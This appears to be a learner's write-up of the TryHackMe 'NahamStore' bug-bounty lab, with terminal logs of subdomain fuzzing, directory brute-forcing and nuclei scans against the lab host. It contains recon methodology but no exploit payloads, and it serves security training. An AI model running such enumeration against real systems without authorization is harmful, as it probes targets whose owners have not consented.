-----
In this room you will learn the basics of bug bounty hunting and web application hacking
---

![](https://pbs.twimg.com/profile_banners/2281370629/1581917395/1500x500)

### NahamStore

 Start Machine

NahamStore has been created to test what you've learnt with [NahamSec's](https://twitter.com/nahamsec) "Intro to Bug Bounty Hunting and Web Application Hacking" [Udemy Course](http://bugbounty.nahamsec.training/). Deploy the machine and once you've got an IP address move onto the next step!  

Udemy Course created by [@NahamSec](https://twitter.com/NahamSec) | Labs created By [@adamtlangley](https://twitter.com/adamtlangley)  

Answer the questions below

I have deployed the machine  

Question Done

### Setup

	To start the challenge you'll need to add an entry into your  /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing to your deployed TryHackMe box.

For Example:  

`MACHINE_IP                  nahamstore.thm`  

When enumerating subdomains you should perform it against the **nahamstore.com** domain. When you find a subdomain you'll need to add an entry into your /etc/hosts or c:\windows\system32\drivers\etc\hosts file pointing towards your deployed TryHackMe box IP address and substitute .com for .thm . For example if you discover the subdomain whatever.nahamstore.com you would add the following entry:

`MACHINE_IP          something.nahamstore.thm`

You'll now be able to view [http://something.nahamstore.thm](http://something.nahamstore.thm/) in your browser.

The tasks can be performed in any order but we suggest starting with subdomain enumeration.

Answer the questions below

I understand!  

Correct Answer

### Recon

Using a combination of subdomain enumeration, brute force, content discovery and fuzzing find all the subdomains you can and answer the below questions.  

Answer the questions below

```
There are nice books to learn bug bounty
https://github.com/m0chan/BugBounty/blob/master/Bug%20Bounty%20Playbook.pdf
https://github.com/akr3ch/BugBountyBooks


┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm

If you're reading this you need to add www.nahamstore.thm and nahamstore.thm to your hosts file pointing to something.nahamstore.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm www.nahamstore.thm nahamstore.thm

need more subdomains

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nahamstore.thm" --hc 404 --hw 65
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nahamstore.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000000001:   301        7 L      13 W       194 Ch      "www"            
000000037:   301        7 L      13 W       194 Ch      "shop"           
000000254:   200        41 L     92 W       2025 Ch     "marketing"      
000000960:   200        0 L      1 W        67 Ch       "stock"   

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://stock.nahamstore.thm/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/stock.nahamstore.thm/-_23-03-19_22-17-54.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-19_22-17-54.log

Target: http://stock.nahamstore.thm/

[22:17:55] Starting: 
[22:19:25] 200 -  148B  - /product

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 10 dir -e -k -u http://nahamstore.thm/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nahamstore.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/19 22:24:04 Starting gobuster in directory enumeration mode
===============================================================
http://nahamstore.thm/basket               (Status: 200) [Size: 2465]
http://nahamstore.thm/css                  (Status: 301) [Size: 178] [--> http://127.0.0.1/css/]
http://nahamstore.thm/js                   (Status: 301) [Size: 178] [--> http://127.0.0.1/js/]
http://nahamstore.thm/login                (Status: 200) [Size: 3099]
http://nahamstore.thm/logout               (Status: 302) [Size: 0] [--> /]
http://nahamstore.thm/register             (Status: 200) [Size: 3138]
http://nahamstore.thm/returns              (Status: 200) [Size: 3628]
http://nahamstore.thm/robots.txt           (Status: 200) [Size: 13]
http://nahamstore.thm/search               (Status: 200) [Size: 3351]
http://nahamstore.thm/staff                (Status: 200) [Size: 2287]
http://nahamstore.thm/uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/19 22:25:40 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ knockpy nahamstore.thm  

  _  __                 _                
 | |/ /                | |   v6.1.0            
 | ' / _ __   ___   ___| | ___ __  _   _ 
 |  < | '_ \ / _ \ / __| |/ / '_ \| | | |
 | . \| | | | (_) | (__|   <| |_) | |_| |
 |_|\_\_| |_|\___/ \___|_|\_\ .__/ \__, |
                            | |     __/ |
                            |_|    |___/ 

local: 10757 | remote: 1 er.py                                                  

Wordlist: 10758 | Target: nahamstore.thm | Ip: 10.10.3.2 

02:25:56

Ip address      Code Subdomain                              Server                                 Real hostname
--------------- ---- -------------------------------------- -------------------------------------- --------------------------------------
                                   10.10.3.2            marketing.nahamstore.thm                                                      something.nahamstore.thm
                                   10.10.3.2       200  shop.nahamstore.thm                    nginx/1.14.0 (Ubuntu)                  something.nahamstore.thm
                                 10.10.3.2            stock.nahamstore.thm                                                          something.nahamstore.thm
                                  10.10.3.2       200  www.nahamstore.thm                     nginx/1.14.0 (Ubuntu)                  something.nahamstore.thm


Ip address: 1 | Subdomain: 4 | elapsed time: 00:10:38 


┌──(witty㉿kali)-[~/Downloads]
└─$ gau nahamstore.com
http://nahamstore.com/
http://nahamstore.com/
http://www.nahamstore.com/cdn-cgi/styles/main.css
http://nahamstore.com/robots.txt
https://nahamstore.com/robots.txt

──(witty㉿kali)-[~/bug_hunter/commoncrawl]
└─$ gobuster -t 10 dir -e -k -u http://marketing.nahamstore.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://marketing.nahamstore.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/19 23:12:45 Starting gobuster in directory enumeration mode
===============================================================
http://marketing.nahamstore.thm/6e6055bd53afb9b6e4394d76e35838c9 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/cfa5301358b9fcbe7aa45b1ceea088c6 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/f05221fb72cfbc1b85256abe00683bc4 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/cdd9dc973c4bf6bc852564ca006418a0 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435383166306330 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/c097c40d3f9a53ff5c7ddfc2f7f1c05c (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435613034323230 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435613034616530 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/64356135653039353435613033613530 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/63646263373534393435386631383830 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/d2813bb8eb6c17bf8725725a007ec859 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD010572CAEB316F4F (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD0106E01622BE22F7 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD010714BF3E1D9D73 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD01070597FACFABDF (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD010312E2BF5CDF8B (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DE010C8DB19BBD56DE (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DF0109B6637F89A9DC (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/0000BDF20016F5DD01070598C94A075F (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/7a69ce99e2ba00f7335ae0a8ae644087 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/f188e102f7e4a96c1aac1d781ddde4ad (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/358af665e81625dbdde1fdc704cc9c38 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/07840a36009e0b55cec33bd718a6d207 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/27e3ba3741dc31a28a09732331c7e763 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/1b51a08359c4ccf44d9323bff9f57fe1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/1cf5818ed6da7d2460b3ed5a86021d97 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/eeaf72df4f307cfc7d6f6e8190dda18e (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/ddb2efe64f5cd053fce1dcdba825143c (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/c55ccb753ee403d5b1846fc04775b5e1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/7b830347c50b917ede192d4457e20e34 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/bff40e98d654a441fb4eb11e9ae5d328 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/BCE481855CDDB2A8C2256CF00046777F (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/A4A37C0775794E72C2256CE9003E8064 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/47fdd908b5d373b6ea372e41a6e64010 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/937389028f61b80ee528cc1c073e90cb (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/52c6800ecf94285c7cf287061c8de669 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/fbf033bb052b4c5ab2f9ed71b28a304c (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/766d856ef1a6b02f93d894415e6bfa0e (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/4dcf435435894a4d0972046fc566af76 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/55c567fd4395ecef6d936cf77b8d5b2b (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/754dda4b1ba34c6fa89716b85d68532b (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/77f959f119f4fb2321e9ce801e2f5163 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/db0b8ca4d31149e1c6354a10214cb047 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/5475CDA198B938FACA256CD40007BBD0 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/1D198D8F9BCCABC3CA256C53000E1E42 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/3dad25e101cb7a4c273fc3787a0a06ca (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/fb8fb1b65f7e25e3412568ce0052e511 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/6dee8c20b2de65004125692e00693585 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/fd2d7e98a7944cc080256985004ee3e1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/F53ED6575AAFC611B55C7BA37E5B7BF7 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/13E3EFA17084BC52802569AC003C03B5 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/29f5f44b75a32efa8025692700438088 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/70d5215f9c6985a5c1256d650027dbf3 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/E0993A3E67EF8021C12570A8004F3817 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/10B1B6E747C29A71C12570A8004F2606 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/ce053af5a230d6e6fba69e83b538c0c3 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/24BF2BC7CA735EED4A256B4800162838 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/9c678349c6517f9b32afce91a4299ffc (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
http://marketing.nahamstore.thm/dc25659fbeac0af10281af48b04244d1 (Status: 302) [Size: 0] [--> /?error=Campaign+Not+Found]
Progress: 220560 / 220561 (100.00%)
===============================================================
2023/03/20 00:29:36 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ assetfinder -subs-only nahamstore.com
nahamstore.com
nahamstore-2020.nahamstore.com
marketing.nahamstore.com
stock.nahamstore.com
www.nahamstore.com
nahamstore.com
www.nahamstore.com
shop.nahamstore.com

1 subdomain more

┌──(witty㉿kali)-[~/bug_hunter/commoncrawl]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.3.2 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm nahamstore-2020.nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/commoncrawl]
└─$ dirsearch -u http://nahamstore-2020.nahamstore.thm/ -i200,302 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/nahamstore-2020.nahamstore.thm/-_23-03-20_00-55-46.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-20_00-55-46.log

Target: http://nahamstore-2020.nahamstore.thm/

[00:55:47] Starting: 

Task Completed

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ amass enum -brute -passive -d nahamstore.com | tee -a subdomains.txt
www.nahamstore.com
stock.nahamstore.com
shop.nahamstore.com
nahamstore-2020.nahamstore.com
nahamstore.com
marketing.nahamstore.com

The enumeration has finished
Discoveries are being migrated into the local database
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt 
www.nahamstore.com
stock.nahamstore.com
shop.nahamstore.com
nahamstore-2020.nahamstore.com
nahamstore.com
marketing.nahamstore.com

https://www.kali.org/tools/chromium/
https://medium.com/@sherlock297/install-aquatone-on-kali-linux-dd2a6850fd32
https://www.kali.org/tools/httpx-toolkit/

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt
www.nahamstore.thm
stock.nahamstore.thm
shop.nahamstore.thm
nahamstore-2020.nahamstore.thm
nahamstore.thm
marketing.nahamstore.thm
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt | httpx-toolkit 

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://www.nahamstore.thm
http://nahamstore-2020.nahamstore.thm
http://shop.nahamstore.thm
http://stock.nahamstore.thm
http://marketing.nahamstore.thm
http://nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt | httpx-toolkit -sc -title

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://www.nahamstore.thm [301] [301 Moved Permanently]
http://nahamstore-2020.nahamstore.thm [403] [403 Forbidden]
http://stock.nahamstore.thm [200] []
http://shop.nahamstore.thm [301] [301 Moved Permanently]
http://marketing.nahamstore.thm [200] [Marketing Manager - Active Campaigns]
http://nahamstore.thm [200] [NahamStore - Home]

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat subdomains.txt | httpx-toolkit | tee -a alivesubdomains.txt

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://shop.nahamstore.thm
http://www.nahamstore.thm
http://stock.nahamstore.thm
http://nahamstore.thm
http://nahamstore-2020.nahamstore.thm
http://marketing.nahamstore.thm
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat alivesubdomains.txt                                        
http://shop.nahamstore.thm
http://www.nahamstore.thm
http://stock.nahamstore.thm
http://nahamstore.thm
http://nahamstore-2020.nahamstore.thm
http://marketing.nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat alivesubdomains.txt | aquatone 
aquatone v1.7.0 started at 2023-03-20T13:18:32-04:00

Targets    : 6
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://stock.nahamstore.thm: 200 OK
http://nahamstore-2020.nahamstore.thm: 403 Forbidden
http://marketing.nahamstore.thm: 200 OK
http://nahamstore.thm: 200 OK
http://shop.nahamstore.thm: 200 OK
http://www.nahamstore.thm: 200 OK
http://stock.nahamstore.thm: screenshot successful
http://nahamstore-2020.nahamstore.thm: screenshot successful
http://marketing.nahamstore.thm: screenshot successful
http://nahamstore.thm: screenshot successful
http://shop.nahamstore.thm: screenshot successful
http://www.nahamstore.thm: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-03-20T13:18:32-04:00
 - Finished at : 2023-03-20T13:18:46-04:00
 - Duration    : 13s

Requests:
 - Successful : 6
 - Failed     : 0

 - 2xx : 5
 - 3xx : 0
 - 4xx : 1
 - 5xx : 0

Screenshots:
 - Successful : 6
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd screenshots                    
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ ls
http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore-2020_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore_thm__da39a3ee5e6b4b0d.png
http__shop_nahamstore_thm__da39a3ee5e6b4b0d.png
http__stock_nahamstore_thm__da39a3ee5e6b4b0d.png
http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ eog http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat alivesubdomains.txt | nuclei

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.8.9

		projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully downloaded nuclei-templates (v9.4.0) to /home/witty/.local/nuclei-templates. GoodLuck!
[INF] Using Nuclei Engine 2.8.9 (outdated)
[INF] Using Nuclei Templates 9.4.0 (latest)
[INF] Templates added in last update: 65
[INF] Templates loaded for scan: 5703
[INF] Targets loaded for scan: 6
[INF] Templates clustered: 1035 (Reduced 5742 Requests)
[tech-detect:nginx] [http] [info] http://www.nahamstore.thm
[nginx-version] [http] [info] http://marketing.nahamstore.thm [nginx/1.14.0]
[nginx-version] [http] [info] http://stock.nahamstore.thm [nginx/1.14.0]
[tech-detect:nginx] [http] [info] http://nahamstore-2020.nahamstore.thm
[tech-detect:nginx] [http] [info] http://stock.nahamstore.thm
[nginx-version] [http] [info] http://nahamstore.thm [nginx/1.14.0]
[tech-detect:bootstrap] [http] [info] http://marketing.nahamstore.thm
[tech-detect:nginx] [http] [info] http://marketing.nahamstore.thm
[tech-detect:nginx] [http] [info] http://shop.nahamstore.thm
[tech-detect:bootstrap] [http] [info] http://nahamstore.thm
[tech-detect:nginx] [http] [info] http://nahamstore.thm
[INF] Using Interactsh Server: oast.online
[http-missing-security-headers:content-security-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://nahamstore-2020.nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://marketing.nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-expose-headers] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://stock.nahamstore.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://nahamstore.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-origin] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-methods] [http] [info] http://nahamstore.thm
[http-missing-security-headers:permissions-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://nahamstore.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-max-age] [http] [info] http://nahamstore.thm
